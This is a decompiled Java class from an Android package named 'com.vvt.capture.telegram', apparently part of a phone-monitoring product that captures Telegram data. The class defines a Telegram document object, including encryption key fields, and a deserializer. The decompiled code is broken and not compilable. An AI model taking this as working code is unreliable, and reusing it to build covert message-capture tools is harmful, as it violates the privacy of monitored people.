package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$Document
  extends TLObject
{
  public long access_hash;
  public ArrayList attributes;
  public String caption;
  public int date;
  public int dc_id;
  public String file_name;
  public long id;
  public byte[] iv;
  public byte[] key;
  public String mime_type;
  public int size;
  public TLRPC.PhotoSize thumb;
  public int user_id;
  public int version;
  
  public TLRPC$Document()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.attributes = localArrayList;
  }
  
  public static Document TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in Document", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_documentEncrypted_old;
      ((TLRPC.TL_documentEncrypted_old)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_document_old;
      ((TLRPC.TL_document_old)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_documentEmpty;
      ((TLRPC.TL_documentEmpty)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_documentEncrypted;
      ((TLRPC.TL_documentEncrypted)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_document;
      ((TLRPC.TL_document)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_document_layer53;
      ((TLRPC.TL_document_layer53)localObject).<init>();
    }
    if (localObject != null) {
      ((Document)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (Document)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$Document.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */